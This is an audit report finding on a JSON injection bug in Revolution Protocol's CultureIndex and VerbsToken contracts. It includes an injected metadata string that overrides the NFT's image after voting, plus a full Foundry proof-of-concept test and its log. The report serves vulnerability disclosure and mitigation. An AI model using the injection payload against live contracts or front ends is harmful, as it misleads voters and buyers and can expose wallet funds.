---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/nft
  - sector/wallet
protocol: "[[Collective]]"
auditors:
  - "[[ZanyBonzy]]"
report: "https://code4rena.com/reports/2023-12-revolutionprotocol"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[fot-slippage]]"
  - "[[governance-voting-power-snapshot]]"
  - "[[nft-metadata-mutability]]"
---
# [H-03] `VerbsToken.tokenURI()` is vulnerable to JSON injection attacks

- id: 30090
- impact: HIGH
- protocol: [[Collective]]
- reporter: ZanyBonzy (Code4rena)
- source: https://code4rena.com/reports/2023-12-revolutionprotocol

## Summary


The reported bug is related to the `CultureIndex` and `VerbsToken` contracts in the Revolution Protocol project. The `CultureIndex` contract has a function called `createPiece()` which does not properly check for malicious characters in the `metadata.image` and `metadata.animationUrl` fields. This can lead to various JSON injection attacks on the `VerbsToken` contract, which is used to create NFTs (non-fungible tokens). These attacks can result in funds being stolen from users' connected wallets and can also lead to the creation of NFTs with inappropriate content, such as violence or pornography. A proof of concept has been provided to demonstrate how this vulnerability can be exploited. It is recommended to sanitize input data using the OWASP JSON Sanitizer library to mitigate this issue. The severity of this bug has been debated, but it is ultimately determined to be a high severity due to the potential impact on user assets and the duty of the protocol to protect its users. 

## Details


<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L209> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L193>

`CultureIndex.createPiece()` function doesn't sanitize malicious charcacters in `metadata.image` and `metadata.animationUrl`,  which would cause `VerbsToken.tokenURI()` suffering various JSON injection attack vectors.

1.  If the front end APP doesn't process the JSON string properly, such as using `eval()` to parse token URI, then any malicious code can be executed in the front end. Obviously, funds in users' connected wallet, such as Metamask, might be stolen in this case.

2.  Even while the front end processes securely, such as using the standard builtin `JSON.parse()` to read URI. Adversary can still exploit this vulnerability to replace art piece image/animation with arbitrary other ones after voting stage completed.

That is the final metadata used by the NFT (VerbsToken) is not the art piece users vote. This attack could be benefit to attackers, such as creating NFTs containing same art piece data with existing high price NFTs. And this attack could also make the project sufferring legal risks, such as creating NFTs with violence or pornography images.

More reference: <https://www.comparitech.com/net-admin/json-injection-guide/>

### Proof of Concept

As shown of `createPiece()` function, there is no check if `metadata.image` and `metadata.animationUrl` contain malicious charcacters, such as `"`, `:` and `,`.

```solidity
File: src\CultureIndex.sol
209:     function createPiece(
210:         ArtPieceMetadata calldata metadata,
211:         CreatorBps[] calldata creatorArray
212:     ) public returns (uint256) {
213:         uint256 creatorArrayLength = validateCreatorsArray(creatorArray);
214: 
215:         // Validate the media type and associated data
216:         validateMediaType(metadata);
217: 
218:         uint256 pieceId = _currentPieceId++;
219: 
220:         /// @dev Insert the new piece into the max heap
221:         maxHeap.insert(pieceId, 0);
222: 
223:         ArtPiece storage newPiece = pieces[pieceId];
224: 
225:         newPiece.pieceId = pieceId;
226:         newPiece.totalVotesSupply = _calculateVoteWeight(
227:             erc20VotingToken.totalSupply(),
228:             erc721VotingToken.totalSupply()
229:         );
230:         newPiece.totalERC20Supply = erc20VotingToken.totalSupply();
231:         newPiece.metadata = metadata;
232:         newPiece.sponsor = msg.sender;
233:         newPiece.creationBlock = block.number;
234:         newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;
235: 
236:         for (uint i; i < creatorArrayLength; i++) {
237:             newPiece.creators.push(creatorArray[i]);
238:         }
239: 
240:         emit PieceCreated(pieceId, msg.sender, metadata, newPiece.quorumVotes, newPiece.totalVotesSupply);
241: 
242:         // Emit an event for each creator
243:         for (uint i; i < creatorArrayLength; i++) {
244:             emit PieceCreatorAdded(pieceId, creatorArray[i].creator, msg.sender, creatorArray[i].bps);
245:         }
246: 
247:         return newPiece.pieceId;
248:     }

```

Adverary can exploit this to make `VerbsToken.tokenURI()` to return various malicious JSON objects to front end APP.

```solidity

File: src\Descriptor.sol
097:     function constructTokenURI(TokenURIParams memory params) public pure returns (string memory) {
098:         string memory json = string(
099:             abi.encodePacked(
100:                 '{"name":"',
101:                 params.name,
102:                 '", "description":"',
103:                 params.description,
104:                 '", "image": "',
105:                 params.image,
106:                 '", "animation_url": "',
107:                 params.animation_url,
108:                 '"}'
109:             )
110:         );
111:         return string(abi.encodePacked("data:application/json;base64,", Base64.encode(bytes(json))));
112:     }

```

For example, if attacker submit the following metadata:

```solidity
ICultureIndex.ArtPieceMetadata({
            name: 'Mona Lisa',
            description: 'A renowned painting by Leonardo da Vinci',
            mediaType: ICultureIndex.MediaType.IMAGE,
            image: 'ipfs://realMonaLisa',
            text: '',
            animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
        });
```

During voting stage, front end gets `image` field by `CultureIndex.pieces[pieceId].metadata.image`, which is `ipfs://realMonaLisa`. But, after voting complete, art piece is minted to `VerbsToken` NFT. Now, front end would query `VerbsToken.tokenURI(tokenId)` to get base64 encoded metadata, which would be:

```solidity
data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=
```

In the front end, we use `JSON.parse()` to parse the above data, we get `image` as `ipfs://fakeMonaLisa`.
![image](https://c2n.me/4jZPsiZ.png)
Image link: <https://gist.github.com/assets/68863517/d769d7ac-db02-4e3b-94d2-dfaf3752b763>

Below is the full coded PoC:

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {RevolutionBuilderTest} from "./RevolutionBuilder.t.sol";
import {ICultureIndex} from "../src/interfaces/ICultureIndex.sol";

contract JsonInjectionAttackTest is RevolutionBuilderTest {
    string public tokenNamePrefix = "Vrb";
    string public tokenName = "Vrbs";
    string public tokenSymbol = "VRBS";

    function setUp() public override {
        super.setUp();
        super.setMockParams();

        super.setERC721TokenParams(tokenName, tokenSymbol, "https://example.com/token/", tokenNamePrefix);

        super.setCultureIndexParams("Vrbs", "Our community Vrbs. Must be 32x32.", 10, 500, 0);

        super.deployMock();
    }

    function testImageReplacementAttack() public {
        ICultureIndex.CreatorBps[] memory creators = _createArtPieceCreators();
        ICultureIndex.ArtPieceMetadata memory metadata = ICultureIndex.ArtPieceMetadata({
            name: 'Mona Lisa',
            description: 'A renowned painting by Leonardo da Vinci',
            mediaType: ICultureIndex.MediaType.IMAGE,
            image: 'ipfs://realMonaLisa',
            text: '',
            animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
        });

        uint256 pieceId = cultureIndex.createPiece(metadata, creators);

        vm.startPrank(address(erc20TokenEmitter));
        erc20Token.mint(address(this), 10_000e18);
        vm.stopPrank();
        vm.roll(block.number + 1); // ensure vote snapshot is taken
        cultureIndex.vote(pieceId);

        // 1. the image used during voting stage is 'ipfs://realMonaLisa'
        ICultureIndex.ArtPiece memory topPiece = cultureIndex.getTopVotedPiece();
        assertEq(pieceId, topPiece.pieceId);
        assertEq(keccak256("ipfs://realMonaLisa"), keccak256(bytes(topPiece.metadata.image)));

        // 2. after being minted to VerbsToken, the image becomes to 'ipfs://fakeMonaLisa'
        vm.startPrank(address(auction));
        uint256 tokenId = erc721Token.mint();
        vm.stopPrank();
        assertEq(pieceId, tokenId);
        string memory encodedURI = erc721Token.tokenURI(tokenId);
        console2.log(encodedURI);
        string memory prefix = _substring(encodedURI, 0, 29);
        assertEq(keccak256('data:application/json;base64,'), keccak256(bytes(prefix)));
        string memory actualBase64Encoded = _substring(encodedURI, 29, bytes(encodedURI).length);
        string memory expectedBase64Encoded = 'eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=';
        assertEq(keccak256(bytes(expectedBase64Encoded)), keccak256(bytes(actualBase64Encoded)));
    }

    function _createArtPieceCreators() internal pure returns (ICultureIndex.CreatorBps[] memory) {
        ICultureIndex.CreatorBps[] memory creators = new ICultureIndex.CreatorBps[](1);
        creators[0] = ICultureIndex.CreatorBps({creator: address(0xc), bps: 10_000});
        return creators;
    }

    function _substring(string memory str, uint256 startIndex, uint256 endIndex)
        internal
        pure
        returns (string memory)
    {
        bytes memory strBytes = bytes(str);
        bytes memory result = new bytes(endIndex-startIndex);
        for (uint256 i = startIndex; i < endIndex; i++) {
            result[i - startIndex] = strBytes[i];
        }
        return string(result);
    }
}
```
</details>

And, test logs:

```solidity
2023-12-revolutionprotocol\packages\revolution> forge test --match-contract JsonInjectionAttackTest -vv
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/JsonInjectionAttack.t.sol:JsonInjectionAttackTest
[PASS] testImageReplacementAttack() (gas: 1437440)
Logs:
  data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.30ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation Steps

Sanitize input data according: <https://github.com/OWASP/json-sanitizer>

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167#issuecomment-1875959168)**

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167#issuecomment-1879698395):**
 > Looks like a `Medium` at the first glance, but after some thought `High` severity seems appropriate due to assets being compromised in a pretty straight-forward way.
>
> 1. The front-end part of the present issue is definitely QA but is part of a more severe correctly identified root cause, see point 4.
> 2. The purpose of using IPFS is *immutability*. Thus, the art piece cannot be simply changed on the server. If users vote on an NFT where the underlying art is hosted on a normal webserver, it's user error.
> 3. I agree that the provided example findings are QA due to lack of impact on contract/protocol level.
> 4. The critical part of this attack is that the art piece (IPFS link) that is voted on will differ from the art piece (IPFS link) in the minted VerbsToken which makes this an issue on protocol level where assets are compromised and users will be misled as a result.
> 
>On the one hand, users have to be careful and review their actions responsibly, but on the other hand it's any protocol's duty to protect users to a certain degree (example: slippage control). 
>
> Here, multiple users are put at risk because of one malicious user.  
>
> Furthermore, due to the voting mechanism and later minting, users are exposed to a risk that is not as clear to see as if they could see the final NFT from the beginning. 
>
> I have to draw the line somewhere and here it becomes evident that the protocol's duty to protect it's users outweighs the required user scrutiny.

_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167)._

***
